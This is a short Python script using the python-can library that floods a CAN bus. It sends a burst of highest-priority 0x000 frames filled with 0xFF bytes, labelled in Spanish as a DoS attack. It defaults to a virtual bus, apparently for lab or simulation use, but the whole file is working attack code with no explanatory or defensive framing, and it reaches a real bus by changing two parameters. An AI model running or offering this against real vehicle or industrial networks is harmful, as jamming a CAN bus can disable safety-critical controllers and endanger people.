import can
import time

def run_dos_attack(channel='virtual_bus', interface='virtual', count=100):
    bus = can.interface.Bus(channel=channel, interface=interface, fd=True)

    try:
        junk_data = b"\xFF" * 8
        print(f"[Ataque DoS] Inyectando ráfaga de {count} mensajes...")
        for _ in range(count):
            msg = can.Message(arbitration_id=0x000, data=junk_data, is_fd=True, is_extended_id=False)
            bus.send(msg)
            time.sleep(0.001)
    finally:
        bus.shutdown()

if __name__ == "__main__":
    run_dos_attack()